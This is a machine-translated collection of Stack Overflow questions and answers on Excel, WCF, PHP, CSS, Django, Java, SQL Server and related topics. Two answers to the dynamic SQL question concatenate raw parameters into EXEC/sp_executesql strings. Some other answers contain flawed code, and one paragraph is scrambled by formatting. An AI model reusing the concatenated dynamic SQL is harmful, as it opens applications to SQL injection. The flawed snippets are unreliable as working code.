[此公式在文本 ( source](https://www.extendoffice.com/documents/excel/1272-excel-extract-email-address.html) )中的任意位置查找电子邮件地址：

```
=TRIM(RIGHT(SUBSTITUTE(LEFT(A1,FIND(" ",A1&" ",FIND("@",A1))-1)," ",REPT(" ",LEN(A1))),LEN(A1))) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-02-14T18:06:25.060

对于使用法语 Excel 的法语用户，您可以使用此功能：

> =SUPPRESPACE(DROITE(SUBSTITUE(GAUCHE(A1;TROUVE(" ";A1&" ";TROUVE("@";A1))-1);" ";REPT(" ";NBCAR(A1)));NBCAR(A1)))

# c# - C# 中的 WCF 服务应该向具有不同访问权限的不同客户端消费者发送不同的数据

> ID：11243424
> 
> 赞同：0
> 
> 时间：2012-06-28T11:15:03.503
> 
> 标签：c#, wcf

我有一个托管 WCF 服务的场景，但应该向不同的客户端返回不同的响应以及不同的安全/身份验证选项。

如何实施？想法和小模型代码将是可观的。

客户端 A 和客户端 B 假设使用该服务。应该给客户 A 一些数据，应该给客户 B 一些其他数据，而且他们都应该有不同的访问权限/权限....

谢谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:20:27.997

有很多方法可以做到这一点；底线是您必须识别正在连接的用户。这可以使用[X509 客户端证书](http://msdn.microsoft.com/en-us/library/ff648360.aspx#Step8)、[HTTP（基本/摘要）身份验证](https://stackoverflow.com/questions/4715752/adding-basic-http-auth-to-a-wcf-rest-service)或客户端在每次请求期间发送的自定义 API 密钥（或凭据）来完成（[在 HTTP 标头](https://stackoverflow.com/questions/964433/how-to-add-a-custom-header-to-every-wcf-calls)中、[消息标头](http://blogs.microsoft.co.il/blogs/bursteg/archive/2006/04/23/141.aspx)中或仅在邮件正文）。

一旦你弄清楚了那部分，你可以让你的代码根据谁发出请求来决定做什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:26:24.453

在您的服务 web.config 中以加密形式设置用户和密码。然后在调用函数时客户端必须传递用户名和密码。这样您就可以识别哪个客户端请求服务并通过身份验证

# php - 发布包含 £ 的 json 字符串

> ID：11243426
> 
> 赞同：1
> 
> 时间：2012-06-28T11:15:09.933
> 
> 标签：php, json, vb6, url-encoding

我有一个 VB6 应用程序，它正在创建一个 JSON 字符串并将其发布到网站 (PHP5)。它可能看起来像这样：

```
data=thisisthejsonstringitcontainsthe&pound;hmtlcharacter&code=123&api_key=321 
```

这是一个问题，因为 £ 被认为是新变量的开始，因此正在剪切 json 字符串。

这是否需要在 VB 源中以某种方式进行编码？或者当它到达网站时我可以做些什么吗？如果它需要由 VB 编码，任何人都可以建议一个合适的功能吗？

我`application/x-www-form-urlencoded`在发布时使用内容类型。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:20:21.843

这似乎有些牵强，但是您是否尝试过事先发送 £ urlencoded？存在`%26pound`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:30:09.357

如果您将 url 参数发送到网络服务器，则需要对它们进行 urlencode。对于不转义并且本身可能包含有问题的字符（包括 JSON）格式的所有参数都是如此。

# css - 如何连续有 3 个部分

> ID：11243431
> 
> 赞同：1
> 
> 时间：2012-06-28T11:15:39.370
> 
> 标签：css, html, class, inline

好的，这就是我所拥有的..

```
 <section id = "main"><!--main section -->
            <h2> Latest Work... </h2>
            <section class="examples"><a href="#"><img src="images/eg.jpg" alt="example"></a> </section>
            <section class="examples"><a href="#"><img src="images/eg.jpg" alt="example"></a> </section>
        </section><!-- end of main section --> 
```

好的，现在我不明白如何将这 3 个部分排成一行。我试过 display: inline-block; 等似乎没有任何效果。我需要定位css文件或img中的部分吗？或两者？帮助！哈哈谢谢 ：）

好的，我在您的帮助下设法做到了。我现在如何将它们居中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:19:41.393

我认为你有一些无效的 html，改成这个

```
<section id = "main"><!--main section -->
            <h2> Latest Work... </h2>
            <span class="examples"><a href="#"><img src="images/eg.jpg" alt="example"></a> </span>
            <span class="examples"><a href="#"><img src="images/eg.jpg" alt="example"></a> </span>
        </section><!-- end of main section --> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:19:56.303

最后，添加：

```
<br style="clear:both"/> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:20:14.853

将此添加到您的 CSS 中。根据需要更改宽度

```
 h2,.examples
    { {float:left;
    margin-left:10px}} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T11:20:26.073

你可以尝试这样的事情：

```
​h2, .examples​ {
    float:left;
    margin: 10px;    
    display:block;
}​ 
```

你可以在这里看到它[http://jsfiddle.net/Phenix/Mwtdb/](http://jsfiddle.net/Phenix/Mwtdb/)

# python - Django限制文件下载

> ID：11243432
> 
> 赞同：3
> 
> 时间：2012-06-28T11:15:47.437
> 
> 标签：python, django, download

有没有办法限制每个用户在 django 中的文件下载速度？我见过像下面这样的例子：

```
filename = __file__ # Select your file here.                                
    wrapper = FileWrapper(file(filename))
    response = HttpResponse(wrapper, content_type='text/plain')
    response['Content-Length'] = os.path.getsize(filename)
    return response 
```

有没有办法限制这一点（比如高级用户获得全速，基本用户获得较慢的下载）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T15:02:00.130

您应该在服务器级别执行此操作。有几个 apache 模块可以帮助你实现你想要的。

[http://blog.mansonthomas.com/2009/02/limit-upload-bandwith-of-your-apache.html](http://blog.mansonthomas.com/2009/02/limit-upload-bandwith-of-your-apache.html)

[http://bwmod.sourceforge.net/](http://bwmod.sourceforge.net/)

# java - Linux 中的类路径限制

> ID：11243436
> 
> 赞同：5
> 
> 时间：2012-06-28T11:16:15.873
> 
> 标签：java, linux

我们正在从shell脚本执行独立的java程序，有一个comman脚本来提及类路径，路径等。在这个通用脚本中，我们现在添加了几个类路径，字符数超过9000。它在测试中工作正常环境。它会在生产中引起任何问题吗？linux中设置类路径有什么限制吗？命令行输入的最大字符是多少...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:26:33.923

不，没有限制。在 Windows 中有（8191 个字符），但在 Linux 下没有。我们使用类路径文件的概念。这些文件列出了应用程序的所有依赖项，例如：

```
...
libs/org/easymock/easymock/2.2/easymock-2.2.jar
libs/org/hamcrest/hamcrest-core/1.1/hamcrest-core-1.1.jar
libs/org/hibernate/hibernate-envers/4.1.0.Final/hibernate-envers-4.1.0.Final.jar
libs/com/google/inject/guice/3.0/guice-3.0.jar
... 
```

然后我们将其转换为可用的类路径并按如下方式运行应用程序：

```
#!/bin/bash

CLASSPATH_FILE=`ls -r1 ${APP-HOME}/classpaths/myapp*.classpath | head -n1`
CLASSPATH=$(cat $CLASSPATH_FILE | sed 's_^libs_ ${APP-HOME}/libs_' | tr -d '\n' | tr -d '\r' | sed 's_.jar/libs/_.jar:/libs/_g' | sed 's_.pom/libs/_.pom:/libs/_g')

java -d64 -cp $CLASSPATH com.blah.main.Main $@ 
```

我们从来没有遇到过问题，而且这些类路径条目变得非常庞大。

编辑：作为旁注，您可以使用 maven 依赖插件来生成依赖项列表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:22:42.593

请参阅有关最大 linux 命令行长度的[这个 stackoverflow 答案。](https://stackoverflow.com/questions/6846263/maximum-length-of-command-line-argument-that-can-be-passed-to-sqlplus-from-lin)

最大命令行长度大约在 128KB 到 2MB 之间。

但是，任何一个参数的最大大小要小得多，而且 9000 个字符可能会有问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:24:28.360

当您在*Java*程序中使用变量`jar`中指定的文件中的某些类时， *JVM*不会加载该类，直到您正在运行的程序显式需要该类（或者如果您从代码中显式加载该类 - 相同主意）。当你有一个很长的文件时，唯一可能出现的问题是在*JVM*找到正确的文件之前检查所需的时间。但这应该不是问题。如果您的程序在测试中表现良好，则不必担心这一点。`classpath`*`classpath``classpath`*`jar`**

# java - Java TCP/IP 服务器 - 通过 Internet 的客户端通信

> ID：11243437
> 
> 赞同：1
> 
> 时间：2012-06-28T11:16:21.033
> 
> 标签：java, tcp, ip

我想在互联网上建立一个 tcp/ip 连接。我已经有两个类，一个处理请求的 tcpserver 和一个连接、发送和接收数据的 tcpclient。

到目前为止，我让它在本地网络上完美运行。通常的 127.0.0.1 / localhost 和我的 192.168.xxx.xxx 地址没有任何问题。

我的问题是，我必须做些什么才能让它在互联网上运行。因为我可能想做一些涉及简单 http/server 的研究，所以我需要它来工作。

我怀疑它是我的防火墙，但它可能是阻止这种类型连接的 ISP。有人有想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:22:57.737

要通过 Internet 提供服务，您需要一个公共 IP 地址。10.xxx 和 192.168.xx 是专用网络。127.xxx 仅适用于本地机器。

客户端可以连接到特定端口的公共 IP 地址。

服务器的调制解调器/路由器/防火墙允许打开此端口并将流量传递到该端口上的服务器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:24:34.150

您需要在路由器中打开一个端口，该端口通向服务器正在侦听的端口。然后，您连接到您的公共 IP。这个 ip 可以在[http://www.visaminip.se/上找到](http://www.visaminip.se/)

# json - Foursquare 探索 API 未在某些帐户上提供场地提示

> ID：11243441
> 
> 赞同：1
> 
> 时间：2012-06-28T11:16:37.383
> 
> 标签：json, api, foursquare

当使用 Foursquare 开发者 API 执行场地搜索时，我收到不同的结果，具体取决于所使用的帐户。

对于给定的授权查询（例如，[https://api.foursquare.com/v2/venues/explore?ll=40.7](https://api.foursquare.com/v2/venues/explore?ll=40.7,-74) ,-74 ），我将返回一组带有“原因”和“地点”对象的项目。在某些帐户上，它还提供“提示”数据；其他人则不然。

此附加信息是否取决于某些帐户设置，还是我遗漏了什么？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T14:53:29.550

探索端点针对每个用户量身定制，并根据社交环境、一天中的时间和用户兴趣提供动态推荐。因此，两个查询可能包含不同的内容，具体取决于查询 API 的人。

例如，如果朋友在附近的场所留下了小费，您更有可能在探索结果中看到这一点，因为它为推荐提供了社交强化。

对于其他场所，可能存在比提示更重要的信号，因此不会出现提示。

官方的foursquare应用程序提供了这些数据的很好的例子，因为探索结果窗格的格式从推荐到推荐略有变化。

希望有帮助吗？

# java - 从命令行创建 jar 文件

> ID：11243442
> 
> 赞同：7
> 
> 时间：2012-06-28T11:16:47.573
> 
> 标签：java, c, command-line, jar

我有以下目录层次结构：

```
SigarTest
 src
    SigarTest
     .java files
 bin
    SigarTest
     .class files 
```

这里，SigarTest 是一个包名。根文件夹在 jdk 的 bin 文件夹中。从那里，我运行以下命令来创建我的项目的 jar 文件 -

```
./jar cfe temp.jar SigarTest.SigarMain SigarTest/bin/ tools.jar sigar.jar mongo-2.7.3.jar 
```

其中 tools.jar、mongo-2.7.3.jar 和 sigar.jar 是必需的，并且与根目录（jdk 的 bin 文件夹）位于同一文件夹中。但是，在运行它时，我得到

```
ClassNotFoundException : SigarTest.SigarMain 
```

我究竟做错了什么 ？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T12:06:50.393

使用[**`-C` *dir***选项](http://docs.oracle.com/javase/6/docs/technotes/tools/windows/jar.html)_

> 在处理以下*inputfiles*参数时，在执行命令期间临时更改目录 ( `cd` *dir* ) 。`jar`

 *如果您执行`jar`问题中的命令并列出 temp.jar 的内容，您将看到类似于以下的输出：

```
$ rm -rf temp.jar
$ jar cfe temp.jar SigarTest.SigarMain SigarTest/bin/ tools.jar sigar.jar mongo-2.7.3.jar
$ jar tf temp.jar
META-INF/
META-INF/MANIFEST.MF
SigarTest/bin/
SigarTest/bin/SigarTest/
SigarTest/bin/SigarTest/SigarMain.class
tools.jar
sigar.jar
mongo-2.7.3.jar
$ java -jar temp.jar
Exception in thread "main" java.lang.NoClassDefFoundError: SigarTest/SigarMain
Caused by: java.lang.ClassNotFoundException: SigarTest.SigarMain
    at java.net.URLClassLoader$1.run(URLClassLoader.java:202)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:247) 
```

请注意，在 temp.jar 中包含 SigarTest/bin 是不正确的。执行 temp.jar 会抛出`ClassNotFoundException`since `SigarMain`is in package `SigarTest.bin.SigarTest`。现在考虑以下`jar`使用**`-C` *dir***选项的命令：

```
$ rm -rf temp.jar
$ jar cfe temp.jar SigarTest.SigarMain -C SigarTest/bin/ . tools.jar sigar.jar mongo-2.7.3.jar
$ jar tf temp.jar
META-INF/
META-INF/MANIFEST.MF
SigarTest/
SigarTest/SigarMain.class
tools.jar
sigar.jar
mongo-2.7.3.jar
$ java -jar temp.jar 
```

`SigarMain`位于正确的包中并且执行 temp.jar 不会抛出`ClassNotFoundException`.*

# sql - 根据当前表值从其他外键表中获取值

> ID：11243446
> 
> 赞同：0
> 
> 时间：2012-06-28T11:17:10.657
> 
> 标签：sql, sql-server, sql-server-2008, tsql

我正在做一个项目，我需要将数据从 excel 表中提取到 SQL Server ，那一点已经成功了。现在我的问题是，对于一个名为 product size 的特定列
，我想根据其他表中的 product size 更新当前表，我真的很困惑，请帮帮我

请查表结构

```
 CREATE TABLE [dbo].[T_Product](
[ProductID] [int] IDENTITY(1,1) NOT NULL,
[PartNo] [nvarchar](255) NULL,
[CategoryID] [int] NULL,
[MaterialID] [float] NULL,
[WireformID] [float] NULL,
[ProductName] [nvarchar](50) NULL,
[ProductSize] [nvarchar](50) NULL,
[ProductLength] [varchar](20) NULL,
[ProductActive] [bit] NULL,
[ProductImage] [varchar](60) NULL
 ) ON [PRIMARY]

     CREATE TABLE [dbo].[T_ProductSize](
[Code] [int] IDENTITY(1,1) NOT NULL,
[ProductSize] [nvarchar](50) NULL,
[Length] [nchar](20) NULL
 ) ON [PRIMARY]

 GO 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:52:12.107

好的，所以忽略前面的答案，我弄错了！

你想要这样的东西，我想：

```
UPDATE T_Product
SET [ProductLength] = ps.[Length]
FROM T_Product p
INNER JOIN T_ProductSize ps
ON p.[ProductSize] = ps.[ProductSize] 
```

这将从 T_ProductSize 获取 Length 值，并根据 T_Product.ProductSize 的值将其放入 T_Product.ProductLength

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:39:40.303

你提到了一个外键，但你没有包含它的定义。它在您的示例中的两个表之间吗？如果是这样，哪些列是关键？产品尺寸是关键吗？如果是这样，那么您的问题没有多大意义，因为两个表中的值相同。

您的意思是说产品大小是否可能存储在单独的表中而不是 T_Product 表中？在这种情况下，您将需要 T_ProductSize 表中的代码，而不是 T_Product 中的 ProductSize（我也可以建议您将其称为“ProductSizeCode”或更好的“ProductSizeId”或类似名称而不是“代码”吗？简单地称为代码的列可以非常混乱，因为您没有简单的方法知道该值在哪个表中）。此外，您应该始终在每个表上创建一个主键：没有外键就不能拥有外键。它们不必是集群的，这取决于您搜索表的方式，但我在此示例中使用集群 PK。这会给你这样的东西：

```
CREATE TABLE [dbo].[T_Product](
    [ProductID] [int] IDENTITY(1,1) NOT NULL,
    [PartNo] [nvarchar](255) NULL,
    [CategoryID] [int] NULL,
    [MaterialID] [float] NULL,
    [WireformID] [float] NULL,
    [ProductName] [nvarchar](50) NULL,
    [ProductSizeId] [int] NOT NULL,
    [ProductLength] [varchar](20) NULL,
    [ProductActive] [bit] NULL,
    [ProductImage] [varchar](60) NULL

CONSTRAINT [PK_T_Product] PRIMARY KEY CLUSTERED 
    (
    [ProductID] ASC
    ) ON [PRIMARY]
) ON [PRIMARY]

GO

CREATE TABLE [dbo].[T_ProductSize](
    [ProductSizeId] [int] IDENTITY(1,1) NOT NULL,
    [ProductSize] [nvarchar](50) NULL,
    [Length] [nchar](20) NULL
CONSTRAINT [PK_T_ProductSize] PRIMARY KEY CLUSTERED 
    (
    [ProductSizeId] ASC
    ) ON [PRIMARY]
) ON [PRIMARY]
GO

--Now add your foreign key to T_Product.
ALTER TABLE [T_Product]  WITH NOCHECK ADD CONSTRAINT [FK_Product_ProductSize] FOREIGN KEY([ProductSizeId])
REFERENCES [T_ProductSize] ([ProductSizeId])
GO
ALTER TABLE [T_Product] CHECK CONSTRAINT [FK_Product_ProductSize]
GO 
```

现在，要检索您的产品以及产品尺寸，请使用以下内容：

```
SELECT p.[ProductID], p.[PartNo], p.[CategoryID], p.[MaterialID], p.[WireformID], p.[ProductName],
    ps.[ProductSize], ps.[Length], p.[ProductLength], p.[ProductActive], p.[ProductImage]
FROM [T_Product] p
INNER JOIN [T_ProductSize] ps
ON ps.[ProductSizeId] = p.[ProductSizeId] 
```

如果我对您的理解正确，那么这就是我认为您所追求的。如果没有，那么再解释一下你需要什么，我会再试一次。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:52:28.493

试试这个...

```
UPDATE  t2
SET     t2.ProductLength = t1.Length
FROM    dbo.T_ProductSize t1
        INNER JOIN dbo.T_Product t2 ON t1.ProductSize = t2.ProductSize 
```

# php - 使用 PHP 从字符串中获取数字

> ID：11243447
> 
> 赞同：14
> 
> 时间：2012-06-28T11:17:12.793
> 
> 标签：php, regex

我有字符串：

```
$one = 'foo bar 4 baz (5 qux quux)';
$two = 'bar baz 2 bar';
$three =  'qux bar 12 quux (3 foo)';
$four = 'foo baz 3 bar (13 quux foo)'; 
```

如何在这些字符串中找到数字？

也许有功能：

```
function numbers($string){

    // ???

    $first = ?;
    $second = ?;
} 
```

例如：

```
function numbers($one){

    // ???

    $first = 4;
    $second = 5;
}

function numbers($two){

    // ???

    $first = 2;
    $second = NULL;
} 
```

最好的方法可能是正则表达式，但我怎样才能在我的例子中使用它呢？也许没有正则表达式？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-06-28T11:23:21.420

您可以为此使用[正则表达式](http://php.net/book.pcre)。`\d` [转义序列](http://php.net/regexp.reference.escape)将匹配主题字符串中的所有数字。

例如：

```
<?php

function get_numerics ($str) {
    preg_match_all('/\d+/', $str, $matches);
    return $matches[0];
}

$one = 'foo bar 4 baz (5 qux quux)';
$two = 'bar baz 2 bar';
$three = 'qux bar 12 quux (3 foo)';
$four = 'foo baz 3 bar (13 quux foo)';

print_r(get_numerics($one));
print_r(get_numerics($two));
print_r(get_numerics($three));
print_r(get_numerics($four)); 
```

[https://3v4l.org/DiDBL](https://3v4l.org/DiDBL)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-28T11:21:36.217

你可以做：

```
$str = 'string that contains numbers';
preg_match_all('!\d+!', $str, $matches);
print_r($matches); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-06-28T11:23:31.273

**这是我没有**正则表达式的尝试

```
function getNumbers($str) {
    $result = array();

    // Check each character.
    for($i = 0, $len = strlen($str); $i < $len; $i++) {
        if(is_numeric($str[$i])) {
            $result[] = $str[$i];
        }
    }

    return $result;
}

$one = 'one two 4 three (5 four five)';
$two = 'one two 2 three';
$three =  'one two 12 three (3 four)';
$four = 'one two 3 three (13 four five)';

var_dump(getNumbers($one));
var_dump(getNumbers($two));
var_dump(getNumbers($three));
var_dump(getNumbers($four)); 
```

// 输出：

```
array(2) {
  [0]=>
  string(1) "4"
  [1]=>
  string(1) "5"
}

array(1) {
  [0]=>
  string(1) "2"
}

array(3) {
  [0]=>
  string(1) "1"
  [1]=>
  string(1) "2"
  [2]=>
  string(1) "3"
}

array(3) {
  [0]=>
  string(1) "3"
  [1]=>
  string(1) "1"
  [2]=>
  string(1) "3"
} 
```

# viewdata - 无法在 StringTemplate 上正确访问 ViewDataDictionary 对象

> ID：11243452
> 
> 赞同：0
> 
> 时间：2012-06-28T11:17:47.700
> 
> 标签：viewdata, stringtemplate

我正在使用 StringTemplate 版本 3.1.4.6002 作为 MVC 项目的视图引擎。我似乎无法访问传递给模板的对象并将其呈现在网页上。所以基本上，我在控制器中有以下内容（在 C# 中）：

```
var layer1 = new { count = "1", label = "Description" };
var layer2 = new { count = "2", label = "Transcription" };
ViewData["layers"] = new object[] {layer1,layer2}; 
```

在视图文件 test.st 中，我有：

```
$layers:{
   $it.count$
   $it.label$
}$ 
```

该模板不会在网页上显示任何内容，但如果我在 test.st 上执行此操作：

```
$layers$ 
```

它将对象显示为：

```
{ count=1, label=Description } { count=2, label=Transcription } 
```

在我看来，这就像一个字符串。那么如何单独访问计数和标签呢？我已经用谷歌搜索了很多，似乎找不到任何可以解决我的问题的东西。

顺便说一句，我使用的是 Visual Studio V10 和 .NET Framework Version4。在项目中，我引用了 Antlr3.Runtime、Antlr3.Runtime.Debug 和 Antlr3.StringTemplate dll。此外，我访问简单的字符串对象也没有问题。我在[这里](http://websitelogic.net/articles/mvc/stringtemplate-viewengine-asp-net-mvc/2)使用了教程项目。如果需要，我可以提供更多详细信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T23:58:57.097

计数和标签字段是公开的吗？或者，如果它们是 getter，它们是公开的吗？

# java - 如何使用 Map 作为“值”之一将 String 转换为 Map？

> ID：11243455
> 
> 赞同：0
> 
> 时间：2012-06-28T11:17:57.763
> 
> 标签：java, map

有人可以帮我把它转换`String`成`Map`...

```
String str = "{"id":1,"result":[{"employeeId":131969,"id":1164299,"name":"Prosjekt","javaClass":"no.tripletex.tcp.model.Project","number":"","displayName":"Prosjekt"}]}" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:23:52.857

从字符串的格式来看，无论您使用哪种语言，您似乎都需要一个 JSON 解析器。

[这里](http://www.json.org/)有很多json解析器

这是一个 Java [json 解析器](http://code.google.com/p/json-simple/wiki/DecodingExamples)，你可以按照它的示例进行操作。

# sql - 编写动态 SQL 函数

> ID：11243457
> 
> 赞同：4
> 
> 时间：2012-06-28T11:18:07.273
> 
> 标签：sql, sql-server, sql-server-2008

我在尝试从 SQL 函数返回表时遇到一些问题，其中创建表的 SQL 是动态编写的。

到目前为止，我有：

```
CREATE FUNCTION dbo.SEL_PCD
(
    @COBDate AS DATETIME,
    @FileName AS VARCHAR(50),
    @PC AS VARCHAR(50),
    @MyList AS VARCHAR(max),

    DECLARE @SQL VARCHAR(max)

    SET @SQL = 'SELECT * FROM 
                    (SELECT tab1.TID FROM
                        (SELECT TID FROM dbo.SEL_RT('+@COBDate+','+@FileName+') WHERE BID IN ('+ @MyList +')) tab1
                    JOIN
                        (SELECT TID FROM CT WHERE (Col_Name LIKE %' + @PC + '% OR Bk LIKE %' + @PC + '%) AND FileName = ' + @FileName + ' AND COBDate = @COBDate) tab2
                    ON tab1.TID = tab2.TID) tab3
                JOIN
                    (SELECT TID, Value FROM CR WHERE BID IN (' + @MyList + ') AND COBDate = ' + @COBDate + ' AND FileName = ' + @FileName + 'AND ScenID = 266) tab7
                ON tab3.TID = tab7.TID'

)
RETURNS TABLE AS
RETURN
(
    EXEC sp_executesql @SQL
)
GO 
```

我在声明 SQL 变量时遇到错误。我可以通过执行命令返回表吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:26:36.290

您不能从函数内调用存储过程，包括存储过程`EXECUTE`或`SP_EXECUTESQL`. 这意味着您不能在函数中嵌入动态 sql。

不能调用存储过程的原因是因为函数***不允许***有副作用*（调用它们本身不能更改任何数据——它们不能插入、更新或删除）*。但是存储过程可以。这意味着调用存储过程的函数将突然变得能够产生副作用。

SP 可以调用函数，而不是相反。

此外，SQL 被编译为执行计划。那时正在使用的表和索引都变得固定。如果一个函数包含可能的动态 sql；要使用的表等在编译时是未知的，SQL 没有这种能力。

在您的情况下，您的查询中似乎需要动态 SQL 的唯一部分是您将逗号分隔的列表作为 @myList 参数传递。但是，还有另一种方法。

寻找`dbo.fn_split()`在线可用的众多功能之一（以及许多在线功能）。然后使用该功能加入数据...

```
CREATE FUNCTION dbo.SEL_PCD( @COBDate     AS DATETIME,
                             @FileName    AS VARCHAR(50),
                             @PC          AS VARCHAR(50),
                             @MyList      AS VARCHAR(max)
                            )
RETURNS TABLE
AS
RETURN
  SELECT
    CR.TID,
    CR.Value
  FROM
    dbo.SEL_RT(@COBDate, @FileName) AS RT
  INNER JOIN
    CT
     ON CT.TID = RT.TID
  INNER JOIN
    CR
     ON CR.TID = RT.TID
  WHERE
    (CT.Col_Name LIKE '%'+@PC+'%' OR CT.Bk LIKE '%'+@PC+'%')
    AND CT.FileName = @FileName
    AND CT.COBDate  = @COBDate
    AND CR.FileName = @FileName
    AND CR.COBDate  = @COBDate
    AND CR.ScenID   = 266
    AND RT.BID IN (SELECT id FROM dbo.fn_split(@myList, ',') AS my_list)
    AND CR.BID IN (SELECT id FROM dbo.fn_split(@myList, ',') AS my_list) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T11:30:24.470

试试这个：

```
CREATE PROCEDURE dbo.SEL_PCD
(
    @COBDate DATETIME,
    @FileName VARCHAR(50),
    @PC VARCHAR(50),
    @MyList VARCHAR(max)
) AS

    DECLARE @SQL VARCHAR(max)

    SELECT @SQL = 'SELECT * FROM 
                    (SELECT tab1.TID FROM
                        (SELECT TID FROM dbo.SEL_RT('+@COBDate+','+@FileName+') WHERE BID IN ('+ @MyList +')) tab1
                    JOIN
                        (SELECT TID FROM CT WHERE (Col_Name LIKE %' + @PC + '% OR Bk LIKE %' + @PC + '%) AND FileName = ' + @FileName + ' AND COBDate = @COBDate) tab2
                    ON tab1.TID = tab2.TID) tab3
                JOIN
                    (SELECT TID, Value FROM CR WHERE BID IN (' + @MyList + ') AND COBDate = ' + @COBDate + ' AND FileName = ' + @FileName + 'AND ScenID = 266) tab7
                ON tab3.TID = tab7.TID'

EXEC(@SQL) 
```

**职能**

*   可与 Select 语句一起使用
*   不返回输出参数但返回表变量
*   你可以加入UDF
*   不能用于更改服务器配置
*   不能与 XML FOR 子句一起使用
*   函数内不能有事务

**存储过程**

*   必须使用 EXEC 或 EXECUTE
*   返回输出参数
*   可以创建表但不会返回表变量
*   你不能加入SP
*   可用于更改服务器配置
*   可与 XML FOR 子句一起使用
*   可以在 SP 内进行交易

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:38:05.710

您不能在函数中使用执行命令

```
CREATE PROCEDURE dbo.SEL_PCD4
(
    @COBDate AS DATETIME,
    @FileName AS VARCHAR(50),
    @PC AS VARCHAR(50),
    @MyList AS VARCHAR(max)
) AS
    DECLARE @SQL VARCHAR(max)

    SET @SQL = 'SELECT * FROM 
                    (SELECT tab1.TID FROM
                        (SELECT TID FROM dbo.SEL_RT('+@COBDate+','+@FileName+') WHERE BID IN ('+ @MyList +')) tab1
                    JOIN
                        (SELECT TID FROM CT WHERE (Col_Name LIKE %' + @PC + '% OR Bk LIKE %' + @PC + '%) AND FileName = ' + @FileName + ' AND COBDate = @COBDate) tab2
                    ON tab1.TID = tab2.TID) tab3
                JOIN
                    (SELECT TID, Value FROM CR WHERE BID IN (' + @MyList + ') AND COBDate = ' + @COBDate + ' AND FileName = ' + @FileName + 'AND ScenID = 266) tab7
                ON tab3.TID = tab7.TID'

    EXEC sp_executesql @SQL 
```

去

# php - 删除特殊字符 \

> ID：11243458
> 
> 赞同：-1
> 
> 时间：2012-06-28T11:18:11.147
> 
> 标签：php, string, special-characters, htmlspecialchars

如何从字符串中删除 html 特殊字符 \。

```
$string = 'This is &#92; a string with &#92; special characters &#92;'; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:24:00.283

```
str_replace("char_to_rep","",$string); // replacing with nothing means deleting 
```

也参考。 [如何删除 html 特殊字符](https://stackoverflow.com/questions/657643/how-to-remove-html-special-chars)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:19:32.657

使用`str_replace`并用空字符替换特殊字符

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:21:26.917

```
str_replace("#"," ",$string) 
```

为所有特殊字符尝试此代码

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-28T10:43:27.557

非常感谢您的帮助，但是下面有更好的方法吗？

```
 $post = '(&repl^eac&e_+';

    function repleace($post) {
        $array = array('.html', '.php', '±', '§', '!', '@', '€', '`', '#', '$', '%', '^', '&', '*', '(', ')', '+', '=', '<', '>', '?', '/', '|', '[', ']', ':', ';', ',', '~', '.');
        $post = str_replace($array, '', $post);
        $post = str_replace(' ', '_', $post);
        $post = str_replace('-', '_', $post);
        return strtolower('/'.$post.'/');
    } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-14T10:34:52.807

```
function($input) {
   $input = preg_replace("/&#?[a-z0-9]{2,8};/i","",$input);
   $input = ucfirst($input);
   return $input;
} 
```

/&#?[a-z0-9]{2,8};/i 字符中的 php pre_repleace 函数工作正常。

# algorithm - 如何防止用户使用大写锁定书写？

> ID：11243459
> 
> 赞同：7
> 
> 时间：2012-06-28T11:18:12.257
> 
> 标签：algorithm, lowercase, capslock

我真的不喜欢用 Caps Lock 写作的人。除了厌恶之外，它还破坏了整个应用程序。我想知道如何防止用户用大写锁定写所有字符。由于特殊名称和缩写，我不能强制所有文本为小写。我应该使用什么逻辑？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-28T11:21:06.197

礼貌地拒绝他们的帖子——解释原因——如果大写字母的数量超过小写字母的数量超过 30 个，比如说。

不要在 FORTRAN 论坛上实现这个

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T11:34:38.463

